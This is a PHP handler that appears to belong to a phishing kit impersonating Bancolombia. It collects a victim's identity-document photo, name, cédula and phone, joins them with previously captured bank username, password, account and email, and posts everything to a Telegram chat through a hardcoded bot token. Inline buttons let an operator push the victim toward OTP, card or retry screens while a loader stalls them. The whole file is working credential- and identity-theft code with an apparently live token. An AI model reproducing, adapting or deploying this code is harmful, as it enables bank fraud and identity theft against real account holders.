<?php
/**
 * enviar_dato_extra3.php
 * ----------------------
 * Handler POST de FOTO / IDENTIDAD (opcion5.html).
 * El usuario sube foto del documento + nombre/cedula/telefono.
 *
 * 7 pasos standard:
 *   1) Recibe $_POST (codigo, key, nombre, cedula, telefono) + $_FILES['photo'].
 *   2) SELECT por key BINARY los datos previos de solicitudes (celular, monto, banco, user, pass, correo).
 *   3) Nuevo request_id BCO_<144 bits> (scope Bancolombia evita colisiones shared webhook).
 *   4) Guardar foto en disco (fallback /tmp si /var/www/html/uploads no es escribible).
 *   5) UPDATE solicitudes: (a) request_id + estado 'pendiente', (b) nombre_id, cedula, foto_path.
 *   6) Enviar foto + caption a Telegram con teclado inline (incluye OPCION_9=ERROR Dinámica / OPCION_10=FINALIZAR).
 *   7) 302 → espera.html?rid=&key=&correo= (loader indefinido hasta botón Telegram).
 */

ob_start();
require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

// ── Paso 1: Lectura segura del POST y files ────────────────────────────────────
$codigo    = $_POST['codigo']   ?? '';
$key       = $_POST['key']      ?? '';
$nombre    = $_POST['nombre']   ?? '';
$cedula    = $_POST['cedula']   ?? '';
$telefono2 = $_POST['telefono'] ?? '';
$fotoTmp   = $_FILES['photo']['tmp_name'] ?? null;
$fotoError = $_FILES['photo']['error']    ?? UPLOAD_ERR_NO_FILE;

if (!$key) {
    die("Error: Key no proporcionada.");
}

// ── Paso 2: Datos previos de la solicitud (WHERE BINARY evita colisiones DB compartida)
$stmt = $pdo->prepare(
    "SELECT numero_cuenta, monto, banco, nombre, telefono, correo
     FROM solicitudes WHERE BINARY `key` = ? LIMIT 1"
);
$stmt->execute([$key]);
$data = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$data) {
    die("Error: Solicitud no encontrada.");
}

$celular = $data['numero_cuenta'];
$monto   = $data['monto'];
$banco   = $data['banco'];
$usuario = $data['nombre'];
$clave   = $data['telefono'];
$correo  = $data['correo'];

// ── Paso 3: Generar RID nuevo con scope BCO_ ──────────────────────────────────
try {
    $nuevo_request_id = 'BCO_' . bin2hex(random_bytes(18));
} catch (Throwable $_) {
    $nuevo_request_id = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
}

// ── Paso 4: Guardar foto en disco (con fallback a /tmp) ───────────────────────
$fotoPath   = null;
$uploadDir  = '/var/www/html/uploads/fotos/';
$safeKey    = preg_replace('/[^a-zA-Z0-9_]/', '_', $key);
$fileName   = $safeKey . '_' . time() . '.jpg';
$destPath   = $uploadDir . $fileName;
$tmpDest    = '/tmp/' . $fileName;

if ($fotoTmp && $fotoError === UPLOAD_ERR_OK) {
    // Intento 1: directorio web accesible
    if (!is_dir($uploadDir)) {
        @mkdir($uploadDir, 0775, true);
    }
    if (@move_uploaded_file($fotoTmp, $destPath)) {
        $fotoPath = 'uploads/fotos/' . $fileName;
    } else {
        // Intento 2: guardar en /tmp y copiar
        if (@move_uploaded_file($fotoTmp, $tmpDest)) {
            @copy($tmpDest, $destPath);
            if (file_exists($destPath)) {
                $fotoPath = 'uploads/fotos/' . $fileName;
            }
        }
        if (!$fotoPath) {
            error_log("FOTO UPLOAD FAIL: key=$key src=$fotoTmp dest=$destPath err=" . (error_get_last()['message'] ?? 'desconocido'));
        }
    }
}

// ── Paso 5: Persistir en DB (2 updates separados por legibilidad) ─────────────
$updateRid = $pdo->prepare(
    "UPDATE solicitudes SET request_id = ?, estado = 'pendiente' WHERE BINARY `key` = ?"
);
$updateRid->execute([$nuevo_request_id, $key]);

$saveId = $pdo->prepare(
    "UPDATE solicitudes SET nombre_id = ?, cedula = ?, foto_path = ? WHERE BINARY `key` = ?"
);
$saveId->execute([$nombre, $cedula, $fotoPath, $key]);

// ── Paso 6: Telegram (sendPhoto si hay archivo válido, sino sendMessage) ──────
// Configuración OPERACIONES: 1) env vars Render (nuevo) 2) fallback hardcode (legacy).
$FALLBACK_BOT_TOKEN_OPS = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";
$FALLBACK_CHAT_ID_OPS   = "-4923753161";
$token   = getenv('TELEGRAM_BOT_TOKEN_OPS') ?: $FALLBACK_BOT_TOKEN_OPS;
$chat_id = getenv('TELEGRAM_CHAT_ID_OPS')   ?: $FALLBACK_CHAT_ID_OPS;

$mensaje  = "✅ <b>[DATO EXTRA: FOTO / CÉDULA]</b> Datos de identidad y foto:\n";
$mensaje .= "------------------------\n";
$mensaje .= "📱 Celular: $celular\n";
$mensaje .= "💰 Monto: $monto\n";
$mensaje .= "🏦 Banco: $banco\n";
$mensaje .= "📧 Correo: $correo\n";
$mensaje .= "------------------------\n";
$mensaje .= "👤 Usuario: $usuario\n";
$mensaje .= "🔒 Clave: $clave\n";
$mensaje .= "------------------------\n";
$mensaje .= "🧾 Nombre ID: $nombre\n";
$mensaje .= "🪪 Cédula: $cedula\n";
$mensaje .= "📞 Teléfono: $telefono2\n";
$mensaje .= "------------------------\n";

// NOTA: se preserva el set ORIGINAL de botones del handler para no afectar funcionalidad.
// Única regla obligatoria: OPCION_9 = ERROR Dinámica, OPCION_10 = FINALIZAR.
$botones = [
    'inline_keyboard' => [[
        ['text' => "🟢DINÁMICA",         'callback_data' => "OPCION_1_$nuevo_request_id"],
        ['text' => "🟢TARJETA",          'callback_data' => "OPCION_2_$nuevo_request_id"],
    ], [
        ['text' => "🔴ERROR USUARIO",     'callback_data' => "OPCION_3_$nuevo_request_id"],
        ['text' => "🔴ERROR Dinámica/OTP",'callback_data' => "OPCION_4_$nuevo_request_id"],
        ['text' => "🟢FOTO",              'callback_data' => "OPCION_5_$nuevo_request_id"],
    ], [
        ['text' => "🔴ERROR Dinámica/OTP",'callback_data' => "OPCION_9_$nuevo_request_id"],
        ['text' => "🟢FINALIZAR",         'callback_data' => "OPCION_10_$nuevo_request_id"],
    ]],
];

$ch = curl_init();
$archivoFotoLocal = null;
if ($fotoTmp && $fotoError === UPLOAD_ERR_OK && $fotoPath && file_exists('/var/www/html/' . $fotoPath)) {
    // Caso A: foto guardada en ruta web
    $telegramUrl   = "https://api.telegram.org/bot$token/sendPhoto";
    $archivoFotoLocal = '/var/www/html/' . $fotoPath;
    $postData = [
        'chat_id'      => $chat_id,
        'caption'      => $mensaje,
        'reply_markup' => json_encode($botones),
        'photo'        => new CURLFile($archivoFotoLocal),
    ];
} elseif ($fotoTmp && $fotoError === UPLOAD_ERR_OK && file_exists($tmpDest)) {
    // Caso B: foto solo en /tmp
    $telegramUrl   = "https://api.telegram.org/bot$token/sendPhoto";
    $archivoFotoLocal = $tmpDest;
    $postData = [
        'chat_id'      => $chat_id,
        'caption'      => $mensaje,
        'reply_markup' => json_encode($botones),
        'photo'        => new CURLFile($archivoFotoLocal),
    ];
} elseif ($fotoTmp && $fotoError === UPLOAD_ERR_OK) {
    // Caso C: archivo subido temporal (sin persistencia), enviar desde tmp_name original si existe
    $telegramUrl   = "https://api.telegram.org/bot$token/sendPhoto";
    $postData = [
        'chat_id'      => $chat_id,
        'caption'      => $mensaje,
        'reply_markup' => json_encode($botones),
        'photo'        => new CURLFile($fotoTmp),
    ];
} else {
    // Caso D: sin foto, enviar solo texto
    $telegramUrl = "https://api.telegram.org/bot$token/sendMessage";
    $postData = [
        'chat_id'      => $chat_id,
        'text'         => $mensaje,
        'reply_markup' => json_encode($botones),
    ];
}

curl_setopt($ch, CURLOPT_URL, $telegramUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

// ── Paso 7: Redirect al loader indefinido ─────────────────────────────────────
header("Location: espera.html?rid=$nuevo_request_id&key=$key&correo=" . urlencode($correo));
exit;
